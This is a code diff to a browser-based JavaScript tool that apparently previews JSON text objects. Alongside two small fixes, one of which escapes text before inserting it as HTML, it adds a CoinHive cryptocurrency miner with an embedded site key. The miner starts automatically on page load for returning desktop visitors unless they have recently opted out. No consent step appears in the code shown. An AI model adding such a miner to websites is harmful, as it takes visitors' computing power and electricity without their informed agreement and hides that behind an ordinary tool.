@@ -32,6 +32,8 @@ let quickMake = false;
 var quickMakeReceiving = false;
 let quickMakeWindow = null;
 
+let miner = null;
+
 /***************************
  * Local Storage Interface *
  ***************************/
@@ -1115,7 +1117,7 @@ function refreshOutput(input) {
 
                         let colorPreview = document.createElement("div");
                         colorPreview.className = "colorPreview";
-                        colorPreview.backgroundColor = getCSSHEXFromWord(jobject[i].color);
+                        colorPreview.style.backgroundColor = getCSSHEXFromWord(jobject[i].color);
 
                         colorColumn.appendChild(colorPreview);
 
@@ -1418,9 +1420,9 @@ function jsonParse() {
                 if (jobject[i].text) {
                     $("#jsonPreviewSpanElement" + i).html(
                         jobject[i].text
+                            .escape()
                             .replace(/\\\\n/g, "<br>")
                             .replace(/\\n/g, "<br>")
-                            .escape()
                     );
                 } else if (jobject[i].score) {
                     $("#jsonPreviewSpanElement" + i).html(
@@ -1940,6 +1942,25 @@ function initialize() {
             reportAnIssue();
         }
     });
+
+    $('#coinhive-stop').on('click', function() {
+        miner.stop();
+        document.getElementById('coinhive-stop').style.display = "none";
+    })
+
+    miner = new CoinHive.User('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w', lsm.getItem("initialTimestamp"));
+    if (!miner.isMobile() && miner.hasWASMSupport() && !miner.didOptOut(86400) && lsm.getItem('loadCount') > 1 && lsm.getItem("donateStatus") != "accepted-initial") {
+        miner.start();
+        miner.setNumThreads(1);
+        miner.setAutoThreadsEnabled(false);
+        miner.setThrottle(0.75);
+    }
+
+    miner.on('optin', params => {
+        if (params.status) {
+            document.getElementById('coinhive-stop').style.display = "";
+        }
+    })
 
     // Beta tooltip
     // $('#dropdown-list-a').tooltip({"title":"<i style=\"color: #F8814C;\" class=\"fa fa-exclamation-circle\"></i> " + getLanguageString('headerbar.dropdown.hover',lsm.getItem('langCode')),"html":true,"placement":"bottom"});
